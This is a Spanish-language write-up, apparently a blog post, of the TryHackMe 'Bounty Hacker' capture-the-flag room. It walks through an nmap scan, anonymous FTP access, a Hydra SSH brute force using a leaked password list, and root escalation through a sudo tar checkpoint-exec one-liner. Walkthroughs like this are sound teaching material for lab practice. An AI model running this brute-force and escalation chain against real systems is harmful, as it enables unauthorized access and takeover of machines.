---
layout: post
author: Temerio
---
![Bounty Hacker](https://i.imgur.com/qodkcem.jpg)
*You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!*

Puedes encontrar la Room [aquí](https://tryhackme.com/room/cowboyhacker) 
___

### Enumeration

```bash
┌──(temerio㉿Hackademy)-[~]
└─$ sudo nmap -p- -sS --min-rate 5000 -Pn 10.10.107.126
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-28 16:38 EDT
Nmap scan report for 10.10.107.126
Host is up (0.27s latency).
Not shown: 55529 filtered ports, 10003 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 127.96 seconds
```
Vemos 3 puertos abiertos y nos conectamos al sitio web(Port 80)
![WebPage](https://i.imgur.com/swkGsAb.png?1)
Al no encontrar nada probamos con el siguiente puerto FTP (Port 21) e intentamos loguearnos como "Anonymous".
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
└─$ ftp 10.10.107.126    
Connected to 10.10.107.126.
220 (vsFTPd 3.0.3)
Name (10.10.107.126:temerio): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
Al dejarnos ingresar procedemos a listar el contenido.
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```
El File Transfer Protocol (FTP) contiene 2 archivos:
- locks.txt
- task.txt

Procedemos a descargarlo mediante el comando "get".
```bash
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (2.5071 MB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (535.5343 kB/s)
```
Una vez descargados los archivos procedemos a visualizarlo en nuestra terminal mediante el comando "cat".
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
Podemos visualizar un nombre en este archivo llamado *lin* este nos puede servir más adelante, continuemos con el siguiente archivo.
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
└─$ cat locks.txt       
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
### Bruteforce
Todo esto se parece a un diccionario de fuerza bruta, usaremos *Hydra* para intentar acceder al sistema.
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
└─$ hydra -l lin -P /home/temerio/Desktop/Thm/BountyHacker/locks.txt 10.10.107.126 -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-28 18:53:45
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.107.126:22/
[22][ssh] host: 10.10.107.126   login: lin   password: (Pass)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-28 18:53:56
```
Mediante Hydra logramos conseguir la contraseña para loguearnos por SSH (Port 22).
Procedemos a conectarnos a la PC de lin:
```bash
┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
└─$ ssh lin@10.10.107.126                                                                  
The authenticity of host '10.10.107.126 (10.10.107.126)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.107.126' (ECDSA) to the list of known hosts.
lin@10.10.107.126's password: (UsarPass)
```
```bash
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ whoami
lin
lin@bountyhacker:~/Desktop$ 

```
Logramos ingresar con exito, estamos en la Pc de lin, ahora debemos ver que archivos tiene.
```bash
lin@bountyhacker:~/Desktop$ ls
user.txt
```
Encontramos la Flag del USER.
```bash
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{UserFlag}
```
### Privilege Escalation
Lo que ahora queda es encontrar una manera de escalar nuestros privilegios para convertirnos en root y eventualmente conseguir la flag de root.
```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
Ahora sabemos que el usuario lin tiene permiso para ejecutar **/bin/tar** como root, esto podría ser de gran ayuda para escalar privilegios.

Mi primer lugar es ir siempre a https://gtfobins.github.io/ para buscar posibles comandos para escalar privilegios mediante un binario específico con permisos especiales.
![GTFObins](https://i.imgur.com/Oh6qmye.png)
Busque **tar** en la barra de búsqueda y haga clic en la misma, desplácese hacia abajo hasta SUDO.
![GTFObinsudo](https://i.imgur.com/1gqBJ48.png)

Siempre debes leer la descripción. Se ve bastante bien para mí, no puedo resistirme a ejecutarlo y obtener root. Vamos a ver. Dedos cruzados..
```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```
Hemos elevado con éxito nuestros privilegios y podemos confirmar que ahora somos root.
Tengo una última cosa que hacer y hemos terminado.. Necesitamos obtener la Flag de Root.
```bash
cat /root/root.txt
THM{RootFlag}
```
___
Eso es todo por esta room, espero que te haya gustado y mantente siempre en #HackMode!
*.-Temerio*
